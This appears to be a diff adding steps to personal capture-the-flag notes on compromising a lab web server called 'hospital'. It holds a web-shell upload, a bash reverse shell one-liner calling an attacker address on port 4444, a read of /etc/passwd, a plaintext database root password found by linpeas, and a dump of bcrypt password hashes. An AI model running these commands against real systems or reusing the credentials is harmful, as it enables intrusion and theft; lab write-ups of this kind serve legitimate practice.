@@ -107,3 +107,38 @@ after using dirsearch found:
     /login.php
     /register.php
     /upload.php
+
+using script (https://github.com/flozz/p0wny-shell/blob/master/shell.php) i manage to get www-data reverse shell
+
+now i need to bash reverse shell
+
+To get reverse shell i used:
+    /usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.120/4444 0>&1'
+using python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+after using cat /etc/passwd we found there is a user name DrWilliams/Lucy Williams
+
+uploaded linpeas to /tmp i found:
+    Searching passwords in config PHP files
+    /var/www/html/config.php:define('DB_PASSWORD', 'my$qls3rv1c3!');
+    /var/www/html/config.php:define('DB_USERNAME', 'root');
+
+going in to /var/www/html/config.php i found a name of DB - hospital
+
+using mysql -u root hospital and entering the password i got in to the DB
+
+there is only one table inside:
+    users
+
+after select * from users i got:
+    +----+----------+--------------------------------------------------------------+---------------------+
+| id | username | password                                                     | created_at          |
++----+----------+--------------------------------------------------------------+---------------------+
+|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
+|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
+|  3 | admin2   | $2y$10$7v4l3hC1BnarrPkWuQrfDezk7V7dsdk2wTDdCwOs85ngcPdGESRkG | 2024-01-15 05:14:13 |
+|  4 | test     | $2y$10$ik.POu32K/gMVW8O3E0sl.GF1iCZ2OXDglzeHm2O0MdiqLeEURYYy | 2024-01-15 07:05:10 |
++----+----------+--------------------------------------------------------------+---------------------+
+4 rows in set (0.001 sec)
+
+
